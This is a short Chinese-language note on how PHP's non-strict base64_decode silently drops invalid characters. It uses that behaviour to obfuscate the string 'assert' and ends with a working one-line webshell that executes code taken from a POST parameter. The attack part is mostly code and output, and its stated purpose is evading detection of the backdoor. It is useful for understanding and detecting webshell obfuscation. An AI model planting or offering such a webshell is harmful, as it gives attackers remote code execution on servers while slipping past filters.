函数定义`base64_decode(string $data, bool $strict = false): string`

`data`编码过的数据

`strict`当设置`strict`为`true`时,一旦输入的数据超出了`base64`字母表,将返回`false`,否则会**静默丢弃无效的字符**(利用点)

同时在base64数据长度不正确时,会自动添加`=`并进行解码

```php
<?php
var_dump(base64_encode('1'));
var_dump(base64_decode(base64_encode('1')));
var_dump(base64_decode('MQ'));
var_dump(base64_decode('MQ='));
```

```
string 'MQ==' (length=4)
string '1' (length=1)
string '1' (length=1)
string '1' (length=1)
```

全版本验证[https://3v4l.org/N5ASY](https://3v4l.org/N5ASY)

静默丢弃无效字符

```php
<?php
var_dump(base64_decode('M张Q三'));
var_dump(base64_decode('M!@#$%^&*()Q!@#$%^&*()'));
```

```
string '1' (length=1)
string '1' (length=1)
```

全版本验证[https://3v4l.org/VaclM](https://3v4l.org/VaclM)

可以利用这一点构造一个webshell

```php
<?php
var_dump(base64_encode('assert'));
var_dump(base64_decode('一Y二X三N四z五Z六X七J八0九'));
var_dump(base64_decode('!@#$%^Y#$%^X@#$%^N@#$%^&z#@$%^&Z$%^&X@#$%J^&*0@#$%'));
```

```
string 'YXNzZXJ0' (length=8)
string 'assert' (length=6)
string 'assert' (length=6)
```

```php
<?php
$a=base64_decode("一Y二X三N四z五Z六X七J八0九");
$a($_POST['a']);
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202202211612216.png)